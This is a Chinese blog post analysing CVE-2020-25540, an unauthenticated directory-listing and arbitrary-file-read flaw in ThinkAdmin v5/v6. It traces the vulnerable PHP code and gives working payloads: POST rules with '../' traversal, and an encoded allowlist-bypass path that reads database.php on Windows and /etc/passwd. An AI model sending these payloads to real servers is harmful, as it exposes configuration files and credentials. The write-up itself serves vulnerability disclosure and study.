@@ -1,0 +1,1056 @@
+<article class="border rounded p-3">
+ <h1 class="pt-3 pb-4 article-title">
+  ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)
+ </h1>
+ <div class="aio-h5 text-muted article-info">
+  <ul class="d-flex flex-wrap aio-list-split-dot">
+   <a href="https://mrxn.net/author/1">
+    Mrxn
+   </a>
+   <li>
+    发表于2020/9/16 21:21
+   </li>
+   <li>
+    7342浏览
+   </li>
+   <li>
+    <a href="#comment" target="_self">
+     0评论
+    </a>
+   </li>
+   <li>
+    <span class="text-bold">
+     1小时
+    </span>
+    阅读
+   </li>
+   <li>
+   </li>
+  </ul>
+ </div>
+ <div style="max-width: 790px;">
+  <script async="" crossorigin="anonymous" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3202499379713676">
+  </script>
+  <ins class="adsbygoogle" data-ad-client="ca-pub-3202499379713676" data-ad-format="fluid" data-ad-layout="in-article" data-ad-slot="2223359147" style="display:block; text-align:center;">
+  </ins>
+  <script>
+   (adsbygoogle = window.adsbygoogle || []).push({});
+  </script>
+ </div>
+ <hr class="my-3"/>
+ <div class="line-numbers my-3 article-content markdown">
+  <p>
+   首先声明：内容来自ThinkAdmin的GitHub的官方项目的issue 由 @
+   <span style="white-space:nowrap;">
+    Hzllaga 师傅提供
+   </span>
+   .
+  </p>
+  <p>
+   <strong>
+    0x1.漏洞简介
+   </strong>
+  </p>
+  <p>
+   ThinkAdmin是一套基于ThinkPHP框架的通用后台管理系统。ThinkAdmin v6版本存在路径遍历漏洞。攻击者可利用该
+   <a href="https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E" target="_blank">
+    漏洞
+   </a>
+   通过GET请求编码参数任意读取远程服务器上的文件。
+  </p>
+  <p>
+   <strong>
+    0x2.影响范围
+   </strong>
+  </p>
+  <p>
+   Thinkadmin ≤ 2020.08.03.01
+  </p>
+  <p>
+   <strong>
+    0x3.漏洞分析复现
+   </strong>
+  </p>
+  <p>
+   app/admin/controller/api/Update.php存在3个function，都是
+   <a href="https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83" target="_blank">
+    不用登录认证
+   </a>
+   就可以使用的，引用列表如下：
+  </p>
+  <p>
+   namespace app\admin\controller\api;
+  </p>
+  <p>
+   use think\admin\Controller;
+  </p>
+  <p>
+   use think\admin\service\InstallService;
+  </p>
+  <p>
+   use think\admin\service\ModuleService;
+  </p>
+  <p>
+   version()可以获取到当前版本：2020.08.03.01，≤这个版本的都有可能存在漏洞
+  </p>
+  <p>
+   URL：http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/version
+  </p>
+  <p>
+   <strong>
+    列目录
+   </strong>
+  </p>
+  <p>
+   node()：
+  </p>
+  <pre class="prettyprint lang-php">/**
+* 读取文件列表
+*/
+public function node()
+{
+    $this-&gt;success('获取文件列表成功！', InstallService::instance()-&gt;getList(
+        json_decode($this-&gt;request-&gt;post('rules', '[]', ''), true),
+        json_decode($this-&gt;request-&gt;post('ignore', '[]', ''), true)
+    ));
+}</pre>
+  <p>
+   直接把POST的rules和ignore参数传给InstallService::instance()-&gt;getList()，根据上面的use引用可以知道文件路径在vendor/zoujingli/think-library/src/service/InstallService.php：
+  </p>
+  <pre class="prettyprint lang-php">/**
+ * 获取文件信息列表
+ * @param array $rules 文件规则
+ * @param array $ignore 忽略规则
+ * @param array $data 扫描结果列表
+ * @return array
+ */
+public function getList(array $rules, array $ignore = [], array $data = []): array
+{
+    // 扫描规则文件
+    foreach ($rules as $key =&gt; $rule) {
+        $name = strtr(trim($rule, '\\/'), '\\', '/');
+        $data = array_merge($data, $this-&gt;_scanList($this-&gt;root . $name));
+    }
+    // 清除忽略文件
+    foreach ($data as $key =&gt; $item) foreach ($ignore as $ign) {
+        if (stripos($item['name'], $ign) === 0) unset($data[$key]);
+    }
+    // 返回文件数据
+    return ['rules' =&gt; $rules, 'ignore' =&gt; $ignore, 'list' =&gt; $data];
+}</pre>
+  <p>
+   $ignore可以不用关注，他会透过_scanList()去遍历$rules数组，调用scanDirectory()去递归遍历目录下的文件，最后在透过_getInfo()去获取文件名与哈希，由下面代码可以知道程序没有任何验证，攻击者可以在未授权的情况下读取服务器的文件列表。
+  </p>
+  <pre class="prettyprint lang-php">/**
+ * 获取目录文件列表
+ * @param string $path 待扫描目录
+ * @param array $data 扫描结果
+ * @return array
+ */
+private function _scanList($path, $data = []): array
+{
+    foreach (NodeService::instance()-&gt;scanDirectory($path, [], null) as $file) {
+        $data[] = $this-&gt;_getInfo(strtr($file, '\\', '/'));
+    }
+    return $data;
+}</pre>
+  <pre class="prettyprint lang-php">/**
+ * 获取所有PHP文件列表
+ * @param string $path 扫描目录
+ * @param array $data 额外数据
+ * @param string $ext 文件后缀
+ * @return array
+ */
+public function scanDirectory($path, $data = [], $ext = 'php')
+{
+    if (file_exists($path)) if (is_file($path)) $data[] = $path;
+    elseif (is_dir($path)) foreach (scandir($path) as $item) if ($item[0] !== '.') {
+        $realpath = rtrim($path, '\\/') . DIRECTORY_SEPARATOR . $item;
+        if (is_readable($realpath)) if (is_dir($realpath)) {
+            $data = $this-&gt;scanDirectory($realpath, $data, $ext);
+        } elseif (is_file($realpath) &amp;&amp; (is_null($ext) || pathinfo($realpath, 4) === $ext)) {
+            $data[] = strtr($realpath, '\\', '/');
+        }
+    }
+    return $data;
+}</pre>
+  <pre class="prettyprint lang-php">/**
+ * 获取指定文件信息
+ * @param string $path 文件路径
+ * @return array
+ */
+private function _getInfo($path): array
+{
+    return [
+        'name' =&gt; str_replace($this-&gt;root, '', $path),
+        'hash' =&gt; md5(preg_replace('/\s+/', '', file_get_contents($path))),
+    ];
+}</pre>
+  <p>
+   读取网站根目录Payload: http://think.admin/ThinkAdmin/public/admin.html?s=admin/api.Update/node
+  </p>
+  <p>
+   POST:
+  </p>
+  <p>
+   rules=["/"]
+  </p>
+  <p>
+   也可以使用../来进行目录穿越
+  </p>
+  <p>
+   rules=["../../../"]
+  </p>
+  <p>
+   演示站：
+  </p>
+  <p>
+   <a href="https://mrxn.net/content/uploadfile/202009/41a21600263205.png" id="ematt:2906" target="_blank">
+    <img alt="ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)" height="300" src="https://mrxn.net/content/uploadfile/202009/thum-41a21600263205.png" title="点击查看原图" width="345"/>
+   </a>
+  </p>
+  <p>
+   <br/>
+  </p>
+  <p>
+   <strong>
+    任意文件读取
+   </strong>
+  </p>
+  <p>
+   get()：
+  </p>
+  <pre class="prettyprint lang-php">/**
+ * 读取文件内容
+ */
+public function get()
+{
+    $filename = decode(input('encode', '0'));
+    if (!ModuleService::instance()-&gt;checkAllowDownload($filename)) {
+        $this-&gt;error('下载的文件不在认证规则中！');
+    }
+    if (file_exists($realname = $this-&gt;app-&gt;getRootPath() . $filename)) {
+        $this-&gt;success('读取文件内容成功！', [
+            'content' =&gt; base64_encode(file_get_contents($realname)),
+        ]);
+    } else {
+        $this-&gt;error('读取文件内容失败！');
+    }
+}</pre>
+  <p>
+   首先从GET读取encode参数并使用decode()解码：
+  </p>
+  <pre class="prettyprint lang-php">/**
+ * 解密 UTF8 字符串
+ * @param string $content
+ * @return string
+ */
+function decode($content)
+{
+    $chars = '';
+    foreach (str_split($content, 2) as $char) {
+        $chars .= chr(intval(base_convert($char, 36, 10)));
+    }
+    return iconv('GBK//TRANSLIT', 'UTF-8', $chars);
+}</pre>
+  <p>
+   解密UTF8字符串的，刚好上面有个加密UTF8字符串的encode()，攻击时直接调用那个就可以了：
+  </p>
+  <pre class="prettyprint lang-php">/**
+ * 加密 UTF8 字符串
+ * @param string $content
+ * @return string
+ */
+function encode($content)
+{
+    [$chars, $length] = ['', strlen($string = iconv('UTF-8', 'GBK//TRANSLIT', $content))];
+    for ($i = 0; $i &lt; $length; $i++) $chars .= str_pad(base_convert(ord($string[$i]), 10, 36), 2, 0, 0);
+    return $chars;
+}</pre>
+  <p>
+   跟进ModuleService::instance()-&gt;checkAllowDownload()，文件路径vendor/zoujingli/think-library/src/service/ModuleService.php：
+  </p>
+  <pre class="prettyprint lang-php">/**
+ * 检查文件是否可下载
+ * @param string $name 文件名称
+ * @return boolean
+ */
+public function checkAllowDownload($name): bool
+{
+    // 禁止下载数据库配置文件
+    if (stripos($name, 'database.php') !== false) {
+        return false;
+    }
+    // 检查允许下载的文件规则
+    foreach ($this-&gt;getAllowDownloadRule() as $rule) {
+        if (stripos($name, $rule) !== false) return true;
+    }
+    // 不在允许下载的文件规则
+    return false;
+}</pre>
+  <p>
+   首先$name不能够是database.php，接着跟进getAllowDownloadRule()：
+  </p>
+  <pre class="prettyprint lang-php">/**
+ * 获取允许下载的规则
+ * @return array
+ */
+public function getAllowDownloadRule(): array
+{
+    $data = $this-&gt;app-&gt;cache-&gt;get('moduleAllowRule', []);
+    if (is_array($data) &amp;&amp; count($data) &gt; 0) return $data;
+    $data = ['config', 'public/static', 'public/router.php', 'public/index.php'];
+    foreach (array_keys($this-&gt;getModules()) as $name) $data[] = "app/{$name}";
+    $this-&gt;app-&gt;cache-&gt;set('moduleAllowRule', $data, 30);
+    return $data;
+}</pre>
+  <p>
+   有一个允许的列表：
+  </p>
+  <p>
+   config
+  </p>
+  <p>
+   public/static
+  </p>
+  <p>
+   public/router.php
+  </p>
+  <p>
+   public/index.php
+  </p>
+  <p>
+   app/admin
+  </p>
+  <p>
+   app/wechat
+  </p>
+  <p>
+   也就是说$name必须要不是database.php且要在允许列表内的文件才能够被读取，先绕过安全列表的限制，比如读取根目录的1.txt，只需要传入：
+  </p>
+  <p>
+   public/static/../../1.txt
+  </p>
+  <p>
+   而database.php的限制在Linux下应该是没办法绕过的，但是在Windows下可以透过"来替换.，也就是传入：
+  </p>
+  <p>
+   public/static/../../config/database"php
+  </p>
+  <p>
+   对应encode()后的结果为：
+  </p>
+  <p>
+   34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34
+  </p>
+  <p>
+   Windows读取database.php：
+  </p>
+  <p>
+   <a href="https://mrxn.net/content/uploadfile/202009/5f831600263205.png" id="ematt:2908" target="_blank">
+    <img alt="ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)" height="300" src="https://mrxn.net/content/uploadfile/202009/thum-5f831600263205.png" title="点击查看原图" width="453"/>
+   </a>
+  </p>
+  <p>
+   演示站读取/etc/passwd：
+  </p>
+  <p>
+   <a href="https://mrxn.net/content/uploadfile/202009/47171600263205.png" id="ematt:2910" target="_blank">
+    <img alt="ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)" height="267" src="https://mrxn.net/content/uploadfile/202009/thum-47171600263205.png" title="点击查看原图" width="600"/>
+   </a>
+  </p>
+  <p>
+   v5连允许列表都没有，可以直接读任意文件。
+  </p>
+  <p>
+   <strong>
+    0x4.漏洞修复
+   </strong>
+  </p>
+  <p>
+   临时方案：
+  </p>
+  <p>
+   <a href="https://mrxn.net/content/uploadfile/202009/5a311600263205.png" id="ematt:2912" target="_blank">
+    <img alt="ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)" height="300" src="https://mrxn.net/content/uploadfile/202009/thum-5a311600263205.png" title="点击查看原图" width="360"/>
+   </a>
+  </p>
+  <p>
+   升级到最新版！
+  </p>
+  <p>
+   来源：
+   <span style="white-space:nowrap;">
+    https://github.com/zoujingli/ThinkAdmin/issues/244
+   </span>
+  </p>
+ </div>
+ <div class="flex-v-between">
+  <ul class="d-flex flex-wrap article-tags">
+   <li>
+    标签：
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">
+     <span class="text-muted">
+      #
+     </span>
+     代码审计
+    </a>
+   </li>
+   <li class="me-2">
+    <a href="https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83">
+     <span class="text-muted">
+      #
+     </span>
+     未授权
+    </a>
+   </li>
+  </ul>
+ </div>
+ <hr class="my-3"/>
+ <script>
+  // 获取当前脚本所在的父容器
+		const parentContainer = document.currentScript.parentElement;
+		let searchContainer = parentContainer.querySelector('article') || parentContainer;
+
+		if (searchContainer) {
+			// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
+			let images = [];
+			const containers = searchContainer.querySelectorAll('.prose, .markdown');
+			containers.forEach(function(container) {
+				images = images.concat(Array.from(container.querySelectorAll('img')));
+			});
+
+			if (images.length === 0) {
+				images = searchContainer.querySelectorAll('img');
+			}
+
+			images.forEach(function(img) {
+				if (img.getAttribute('data-action') === 'zoom') {
+					const parentLink = img.parentNode;
+					if (parentLink.tagName === 'A') {
+						parentLink.setAttribute('data-fancybox', 'gallery');
+					}
+				} else {
+					const link = document.createElement('a');
+					link.setAttribute('data-fancybox', 'gallery');
+					link.setAttribute('href', img.getAttribute('src'));
+
+					img.parentNode.insertBefore(link, img);
+					link.appendChild(img);
+				}
+			});
+
+			// 初始化 Fancybox
+			Fancybox.bind("[data-fancybox]", {
+				// 您的自定义选项
+			});
+		}
+ </script>
+ <div class="x_nav_toc">
+  <div class="x_toc_header">
+   <span class="x_toc_title">
+    文章目录
+   </span>
+   <button class="x_toc_close">
+    ×
+   </button>
+  </div>
+  <div class="x_toc_content">
+   <ul class="x_anchor-list">
+   </ul>
+  </div>
+ </div>
+ <button class="x_toc_toggle">
+  <svg fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+   <line x1="3" x2="21" y1="12" y2="12">
+   </line>
+   <line x1="3" x2="21" y1="6" y2="6">
+   </line>
+   <line x1="3" x2="21" y1="18" y2="18">
+   </line>
+  </svg>
+ </button>
+ <style type="text/css">
+  .x_nav_toc {
+    position: fixed;
+    top: 0;
+    right: -300px;
+    width: 280px;
+    height: 100%;
+    background-color: white;
+    box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
+    z-index: 1000;
+    transition: right 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+    padding-top: 10px;
+}
+
+.x_nav_toc.active {
+    right: 0;
+    
+    
+}
+
+
+.x_toc_header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    height: 48px;
+    border-bottom: 1px solid #eee;
+}
+
+.x_toc_title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #333;
+}
+
+.x_toc_close {
+    background: none;
+    border: none;
+    font-size: 24px;
+    cursor: pointer;
+    color: #777;
+    transition: color 0.2s;
+}
+
+.x_toc_close:hover {
+    color: #333;
+}
+
+.x_toc_content {
+    flex: 1;
+    overflow-y: auto;
+    padding: 15px 20px;
+    padding-right: 10px;
+}
+
+.x_anchor-list {
+    list-style-type: none;
+    padding: 0;
+    margin: 0;
+}
+
+/* 减小目录项间距 */
+.x_anchor-list li {
+    margin-bottom: 4px; /* 间距从8px减小到4px */
+}
+
+.x_anchor-list a {
+    text-decoration: none;
+    color: #555;
+    display: block;
+    padding: 6px 10px; /* 减少内边距 */
+    transition: all 0.2s;
+    font-size: 14px;
+    border-radius: 4px;
+    line-height: 1.4; /* 减小行高 */
+}
+
+.x_anchor-list a:hover,
+.x_anchor-list a:focus {
+    background-color: #f8f9fa;
+    color: #0068d6;
+}
+
+
+
+.toc-number {
+    font-weight: 600;
+    margin-right: 8px;
+    color: #495057;
+    display: inline-block;
+    min-width: 25px;
+}
+
+/* 减小各级标题间距 */
+.toc-h1 {
+    font-weight: 600;
+    font-size: 15px;
+    margin-top: 10px; /* 上边距从15px减小到10px */
+    padding-left: 5px !important;
+}
+
+.toc-h2 {
+    font-size: 14px;
+    padding-left: 15px !important; /* 缩进从20px减小到15px */
+}
+
+.toc-h3 {
+    font-size: 13px;
+    padding-left: 25px !important; /* 缩进从30px减小到25px */
+}
+
+.toc-h4 {
+    font-size: 12px;
+    padding-left: 35px !important; /* 缩进从40px减小到35px */
+}
+
+/* 修改后的切换按钮样式 - 使用图标且位置下移 */
+.x_toc_toggle {
+    position: fixed;
+    bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
+    border-radius: 50%;
+    border: none;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    z-index: 999;
+    transition: all 0.3s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0;
+    
+}
+
+.x_toc_toggle svg {
+   width:24px;height:24px;stroke:#3d9bff;
+}
+
+.x_toc_toggle:hover {
+    #background-color: #0081f8;
+    transform: translateY(-3px);
+    box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+}
+
+@media (max-width: 768px) {
+    .x_nav_toc {
+        width: 280px;
+    }
+    .x_toc_toggle {
+        bottom: 100px; /* 手机端也下移位置 */
+        right: 30px;
+        width: 40px;
+        height: 40px;
+    }
+    .x_toc_toggle svg {
+        width: 20px;
+        height: 20px;
+    }
+}
+ </style>
+ <script>
+  document.addEventListener('DOMContentLoaded', function() {
+    // 获取所有标题元素
+    var className = ".line-numbers"; 
+    var selectors = [];
+    for (var i = 1; i <= 6; i++) {
+        selectors.push(className + ' h' + i);
+    }
+    var headings = document.querySelectorAll(selectors.join(', '));
+    
+    // 获取DOM元素
+    var tocContainer = document.querySelector('.x_nav_toc');
+    var toggleButton = document.querySelector('.x_toc_toggle');
+    var tocList = document.querySelector('.x_anchor-list');
+    var closeButton = document.querySelector('.x_toc_close');
+    var currentHighlight = null;
+    
+                
+    // 检测是否为移动设备
+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // 如果没有标题，隐藏所有元素
+    if (headings.length === 0) {
+        tocContainer.style.display = 'none';
+        toggleButton.style.display = 'none';
+        return;
+    }
+    
+    // 初始化层级计数器
+    var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
+    var currentLevel = 0;
+    
+    // 生成带数字编号的目录
+    headings.forEach(function(heading, index) {
+        var level = parseInt(heading.tagName[1]);
+        
+        // 更新计数器
+        counters[level - 1] += 1; // 增加当前级别计数器
+        
+        // 重置更低级计数器
+        for (var i = level; i < 6; i++) {
+            counters[i] = 0;
+        }
+        
+        // 生成编号字符串（如"1.2.3"）
+        var numberParts = [];
+        for (var i = 0; i < level; i++) {
+            if (counters[i] > 0) {
+                numberParts.push(counters[i]);
+            }
+        }
+        var numberText = numberParts.join('.')+'.';
+        
+        // 创建唯一ID
+        var id = 'toc-' + numberText.replace(/\./g, '-');
+        heading.id = id;
+        
+        var listItem = document.createElement('li');
+        var anchor = document.createElement('a');
+        var numberSpan = document.createElement('span');
+        
+        numberSpan.className = 'toc-number';
+        numberSpan.textContent = numberText;
+        anchor.appendChild(numberSpan);
+        anchor.innerHTML += heading.textContent;
+        anchor.href = '#' + id;
+        anchor.classList.add('toc-h' + level);
+        
+        listItem.appendChild(anchor);
+        tocList.appendChild(listItem);
+        
+        // 添加点击事件（不关闭目录）
+        anchor.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            
+           
+            // 更新高亮状态
+            if (currentHighlight) {
+                currentHighlight.classList.remove('active');
+            }
+            this.classList.add('active');
+            currentHighlight = this;
+            
+            // 滚动到对应位置
+            var targetId = this.getAttribute('href').substring(1);
+            var targetElement = document.getElementById(targetId);
+            if (targetElement) {
+                var header = document.querySelector("header");
+                var headerHeight = header ? header.offsetHeight : 0;
+                var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
+                var offsetPosition = elementPosition - headerHeight - 20;
+                
+                window.scrollTo({
+                    top: offsetPosition,
+                    behavior: 'smooth'
+                });
+                
+                // 滚动到目录项的可视区域
+                this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
+    
+
+          // 点击事件中
+          if (isMobile) {
+           closeToc(); // 移动端点击后关闭目录
+          }
+            
+                
+            }
+        });
+    });
+    
+    // 切换按钮点击事件
+    toggleButton.addEventListener('click', function() {
+        tocContainer.classList.add('active');
+     
+    });
+    
+    // 关闭按钮点击事件
+    closeButton.addEventListener('click', function(e) {
+        e.stopPropagation();
+        closeToc();
+    });
+    
+  
+    
+    // 滚动时更新高亮状态
+    window.addEventListener('scroll', function() {
+    
+    var fromTop = window.scrollY;
+    var header = document.querySelector("header");
+    var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
+    
+    
+     //console.log(headerHeight);
+    
+    
+    
+    // 精准计算标题文档位置
+    var activeSection = null;
+    headings.forEach(function(heading) {
+        var section = document.getElementById(heading.id);
+        if (!section) return;
+        
+        // 使用getBoundingClientRect获取精确位置
+        var rect = section.getBoundingClientRect();
+        var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
+        var sectionBottom = rect.bottom + fromTop + headerHeight;
+        
+        // 增加20px激活区域缓冲
+        if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
+            activeSection = heading;
+        }
+    });
+
+
+ 
+
+    // 更新高亮状态（新增精确边界判断）
+    if (activeSection) {
+        var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
+
+        if (tocLink && currentHighlight !== tocLink) {
+            if (currentHighlight) {
+            currentHighlight.blur();
+            currentHighlight.classList.remove('active');
+            }
+            
+            
+            tocLink.classList.add('active');
+           tocLink.focus();
+            currentHighlight = tocLink;
+            
+            // 平滑滚动到可视区域（改进触发条件）
+            var tocRect = tocLink.getBoundingClientRect();
+            var tocContainerRect = tocContainer.getBoundingClientRect();
+            if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
+                tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
+            }
+        }
+    }
+});
+    
+    // 关闭目录面板
+    function closeToc() {
+        tocContainer.classList.remove('active');
+      
+    }
+});
+ </script>
+ <style>
+  /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        #qrcode-right {
+            display: none;
+        }
+    }
+ </style>
+ <div class="copyright-plugin" style="padding:10px; font-size:14px; display:flex; justify-content: space-between; align-items: center;">
+  <div>
+   版权所有：
+   <a href="https://mrxn.net/">
+    Mrxn's Blog
+   </a>
+   <br/>
+   文章标题：
+   <a href="https://mrxn.net/jswz/360.html">
+    ThinkAdmin v5和v6 未授权列目录/任意文件读取(CVE-2020-25540)
+   </a>
+   <br/>
+   文章链接：
+   <a href="https://mrxn.net/jswz/360.html">
+    https://mrxn.net/jswz/360.html
+   </a>
+   <br/>
+   本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。
+  </div>
+  <!-- 右侧二维码 -->
+  <div id="qrcode-right">
+   <div id="copyright-qrcode">
+   </div>
+   <div style="text-align: center;font-size:12px;">
+    设备上扫码阅读
+   </div>
+  </div>
+  <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+  </script>
+  <script>
+   var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/360.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+  </script>
+ </div>
+ <div class="posts_related">
+  <h3>
+   📚 推荐阅读
+  </h3>
+  <ul>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html">
+     深信服运维安全管理系统 install_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html">
+     深信服运维安全管理系统 del_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html">
+     深信服运维安全管理系统 upload_file 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html">
+     深信服运维安全管理系统 csspost/update 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html">
+     深信服运维安全管理系统 save_SNMP 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html">
+     深信服运维安全管理系统 getLdap 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html">
+     深信服运维安全管理系统 Jwt 密钥硬编码
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html">
+     深信服运维安全管理系统 del_route 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html">
+     深信服运维安全管理系统 del_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html">
+     深信服运维安全管理系统 change_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html">
+     九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html">
+     九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/qinglong-auth-bypass-rce.html">
+     青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html">
+     九佳易管理系统 picHY.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-install-config-rce.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html">
+     东胜物流软件 MsChDuiController 多个SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-Public-download.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html">
+     东胜物流软件 MsAnnounceController SQL注入漏洞
+    </a>
+   </li>
+  </ul>
+ </div>
+ <style>
+  /* 底部展示样式 */
+        .qrcode-bottom-box {
+            margin: 40px auto;
+            text-align: center;
+        }
+        .qrcode-title {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 0px;
+            font-weight: bold;
+            text-align: center;
+        }
+        .qrcode-bottom-box img {
+            display: inline-block;
+            padding: 10px;
+            background: #fff;
+            border-radius: 8px;
+            margin: 10px auto;
+        }
+
+/* 悬浮展示样式 */
+
+.qrcode-float {
+    position: fixed;
+    z-index: 9999;
+    background: rgba(255,255,255,0.98);
+    padding: 20px;
+    border-radius: 12px;
+    
+   
+}
+.qrcode-float:hover {
+           transform: scale(1.05);
+    }
+
+
+      
+   
+   /* 移动端适配 */
+    @media (max-width: 1440px) {
+        .qrcode-float {
+            right: 2%;
+            transform: none;
+        }
+    }
+    
+    /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        .qrcode-float {
+            display: none;
+        }
+    }
+ </style>
+ <div class="qrcode-float">
+  <div id="posts-qrcode">
+  </div>
+  <div class="qrcode-title" style="font-size: 12px;">
+   手机扫码阅读
+  </div>
+ </div>
+ <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+ </script>
+ <script>
+  var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/360.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+ </script>
+</article>
